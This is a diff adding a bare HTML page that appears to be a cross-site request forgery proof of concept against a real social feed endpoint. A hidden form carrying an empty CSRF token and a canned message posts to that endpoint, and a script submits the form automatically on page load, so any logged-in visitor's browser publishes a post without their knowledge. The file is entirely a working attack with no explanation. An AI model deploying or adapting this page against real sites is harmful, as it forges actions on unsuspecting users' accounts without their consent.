@@ -1,0 +1,25 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head
+    >
+    <body>
+
+        <form action='http://i.dxy.cn/snsapi/home/feeds/add' method='post' id="csrf_site_target" style="display:hidden">
+            <input type="hidden" name="csrfToken" value="">
+            <input type="hidden" name="body" value="hello,xiang is hero! ">
+            <input type="hidden" name="site_url" value="http://">
+            <input type="hidden" name="site_title" value="">
+            <input type="hidden" name="imageId" value="">
+
+        </form>
+        <script type="text/javascript">
+            var target=document.getElementById('csrf_site_target');
+            target.submit();
+        </script>
+
+    </body>
+</html>
